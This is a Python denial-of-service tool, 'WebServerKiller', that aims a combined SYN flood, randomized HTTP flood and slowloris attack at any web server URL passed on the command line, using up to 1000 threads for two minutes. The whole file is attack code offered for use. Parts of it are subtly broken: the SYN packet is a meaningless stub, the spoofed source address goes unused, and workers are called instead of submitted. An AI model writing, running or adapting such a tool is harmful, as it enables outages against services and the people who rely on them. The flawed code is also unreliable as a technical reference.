#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys
from urllib.parse import urlparse
import requests
from concurrent.futures import ThreadPoolExecutor

class WebServerKiller:
    def __init__(self, target_url, threads=500, duration=60):
        self.target_url = target_url
        self.threads = threads
        self.duration = duration
        self.parsed = urlparse(target_url)
        self.ip = socket.gethostbyname(self.parsed.hostname)
        self.port = self.parsed.port or 80 if self.parsed.scheme == 'http' else 443
        self.ua_list = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
    
    def syn_flood(self):
        """Layer 4 SYN flood - exhausts connection table"""
        def syn_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    # Raw SYN packet (simplified - use scapy for production)
                    sock.sendto(b'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', (self.ip, self.port))
                except:
                    pass
        return syn_worker
    
    def http_flood(self):
        """Layer 7 HTTP flood - CPU/memory exhaustion"""
        def http_worker():
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.ua_list)})
            while self.running:
                try:
                    # Large GET requests with random paths
                    path = f"/?{random.randint(1,999999)}&crash=1"
                    resp = session.get(self.target_url + path, timeout=1)
                except:
                    pass
        return http_worker
    
    def slowloris(self):
        """Slowloris - connection exhaustion"""
        def slow_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.ip, self.port))
            sock.send(f"GET / HTTP/1.1\r\nHost: {self.parsed.hostname}\r\n".encode())
            
            while self.running:
                try:
                    sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    time.sleep(1)
                except:
                    break
        return slow_worker
    
    def attack(self):
        print(f"[+] TARGET: {self.target_url}")
        print(f"[+] IP: {self.ip}:{self.port} | Threads: {self.threads} | Duration: {self.duration}s")
        print("[+] Starting COMBO attack (SYN + HTTP + Slowloris)")
        
        self.running = True
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Mix attack types
            for i in range(self.threads // 3):
                executor.submit(self.syn_flood()())
                executor.submit(self.http_flood()())
                executor.submit(self.slowloris()())
        
        # Monitor
        while time.time() - start_time < self.duration:
            print(f"\r[+] Running... {time.time() - start_time:.1f}/{self.duration}s", end='')
            time.sleep(1)
        
        self.running = False
        print("\n[+] Attack completed")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 web_killer.py http://your-webserver.com")
        sys.exit(1)
    
    killer = WebServerKiller(sys.argv[1], threads=1000, duration=120)
    killer.attack()
